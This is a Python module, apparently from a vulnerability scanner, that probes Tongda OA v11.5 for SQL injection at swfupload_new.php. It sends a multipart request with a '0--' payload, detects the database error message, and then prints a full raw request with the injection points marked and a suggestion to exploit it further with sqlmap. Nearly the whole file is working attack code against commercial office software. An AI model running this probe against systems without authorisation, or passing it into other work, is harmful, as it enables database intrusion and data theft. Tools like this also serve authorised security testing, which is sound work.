import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging



def 通达OA_v11_5_swfupload_sql(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    headers = {
        "User-Agent": "Go-http-client/1.1",
        "Accept-Encoding":"gzip",
        "Content-Type":"multipart/form-data; boundary=----------GFioQpMK0vv2"
        }
    data='''------------GFioQpMK0vv2
Content-Disposition: form-data; name="ATTACHMENT_ID"

1
------------GFioQpMK0vv2
Content-Disposition: form-data; name="ATTACHMENT_NAME"

1
------------GFioQpMK0vv2
Content-Disposition: form-data; name="FILE_SORT"

2
------------GFioQpMK0vv2
Content-Disposition: form-data; name="SORT_ID"

0--
------------GFioQpMK0vv2--
'''
    exp_url=urldata+'general/file_folder/swfupload_new.php'
    try:
        requests.packages.urllib3.disable_warnings()
        upload = requests.post(exp_url, headers=headers, data=data, verify=False)
        if upload.status_code == 200 and '不安全的SQL语句' in upload.text:
            print(Vcolors.RED + "[+] 可能存在POST_sql注入漏洞 请使用sqlmap尝试进一步利用" + Vcolors.ENDC)
            print(''' [SUCCESS]  请修改数据包为:
                       POST /general/file_folder/swfupload_new.php HTTP/1.1
                       Host: {}   #ip地址
                       User-Agent: Go-http-client/1.1
                       Content-Length: 355
                       Content-Type: multipart/form-data; boundary=----------GFioQpMK0vv2
                       Accept-Encoding: gzip
    
                       ------------GFioQpMK0vv2
                       Content-Disposition: form-data; name="ATTACHMENT_ID"
    
                       1
                       ------------GFioQpMK0vv2
                       Content-Disposition: form-data; name="ATTACHMENT_NAME"
                       
                       1
                       ------------GFioQpMK0vv2
                       Content-Disposition: form-data; name="FILE_SORT"

                       2   #可能存在的注入点
                       ------------GFioQpMK0vv2
                       Content-Disposition: form-data; name="SORT_ID"
           
                       0-- #可能存在的注入点
                       ------------GFioQpMK0vv2--''')
        else:
            print(Vcolors.WARNING + "[x] 不存在通达OA v11.5 swfupload_new.php SQL注入漏洞" +Vcolors.ENDC)
    except:
        logging.error("通达OA_v11_5_swfupload_sql脚本出现异常")



